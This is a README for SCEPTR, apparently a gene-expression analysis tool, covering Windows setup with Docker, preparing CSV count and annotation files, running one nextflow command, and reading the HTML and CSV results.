# 🧬 SCEPTR - Analyze gene activity in your samples

[![](https://img.shields.io/badge/Download-SCEPTR_Software-blue)](https://github.com/huntleethin9336/SCEPTR)

SCEPTR helps researchers understand gene activity patterns. It maps functional programs across expression gradients to reveal biological insights. Use this tool for clinical samples, non-model organisms, or datasets that lack replicates. It provides significance testing to ensure your results hold weight.

## 🛠 Prerequisites

Before you start, ensure your Windows computer meets these requirements:

* Windows 10 or Windows 11.
* At least 8 gigabytes of memory.
* A stable internet connection.
* Docker Desktop software installed on your machine.

If you do not have Docker Desktop, visit the Docker website. Download the installer for Windows and follow the prompts. Restart your computer after the installation finishes. Docker acts as a container for the SCEPTR software. It ensures the tool runs safely on your system without interfering with other applications.

## 📥 Getting Started

Visit the official repository page to download the software package.

[Download SCEPTR here](https://github.com/huntleethin9336/SCEPTR)

Once you reach the link, look for the section labeled Releases. Select the latest version available. Click the file ending in .zip to save it to your computer.

After your download finishes, navigate to your Downloads folder. Right-click the folder and choose Extract All. Place these files in a folder on your Desktop for easy access.

## ⚙️ Setting Up Your Data

SCEPTR requires two primary files to run your analysis. Organize your files in a clear folder structure before you begin. Place your files inside the folder you extracted.

1. **Gene Expression Matrix:** A spreadsheet file containing your gene counts. The first column must contain gene identifiers. The subsequent columns should hold the expression values for each sample.
2. **Annotation File:** A file that links your genes to biological pathways. This allows the software to categorize expression patterns.

Ensure these files use a comma-separated format. This prevents formatting errors during the import process.

## 🚀 Running the Analysis

Open your Command Prompt or PowerShell application. You can find these by typing their names in the Windows search bar.

Change your directory to the folder where you saved the SCEPTR files. Type `cd` followed by the path on your computer. Press Enter.

Next, initiate the analysis process. Type the following command:

`nextflow run SCEPTR.nf --counts matrix.csv --annotations mapping.csv`

The software will begin processing your data. It connects to the Docker container to perform calculations. You will see progress bars appear in your terminal window. Do not close the window while these bars remain active.

## 📊 Understanding Your Results

Once the process finishes, navigate back to your project folder. The software creates a new folder named results. Open this folder to view your output files.

* **summary.html:** A visual map of your gene expression data. Open this file in any web browser to see charts and graphs.
* **scores.csv:** A detailed list showing the significance of each pathway found in your data. Use this file to identify key genes.
* **logs.txt:** A record of the steps performed during your analysis. Open this if you need to troubleshoot unexpected results.

Higher scores in the results file indicate a strong connection between the gene pathway and your sample. A low p-value suggests that your findings are statistically meaningful.

## 💡 Best Practices

* Run your analysis on a clean dataset. Remove empty rows or columns from your spreadsheet before starting.
* Keep your files in a folder with no spaces in the name. Spaces sometimes cause issues with command line tools.
* Run one analysis at a time to keep your computer memory free.
* Document your method by saving the command used. Use this for future reference or to share your research process with others.

## 🧪 Troubleshooting Common Issues

If you encounter an error message regarding Docker, ensure the Docker Desktop application remains open. Click the Docker icon in your system tray to verify that the engine shows a running status.

If the software fails to read your files, check for hidden characters in your excel sheets. Save your files as plain CSV files to avoid hidden formatting markers.

If the window shows a permission error, try running your Command Prompt as an administrator. Right-click the app icon and select Run as Administrator.

This software performs complex genomic calculations. Large datasets might take several minutes to process. Patience ensures the software completes the full significance testing procedures correctly.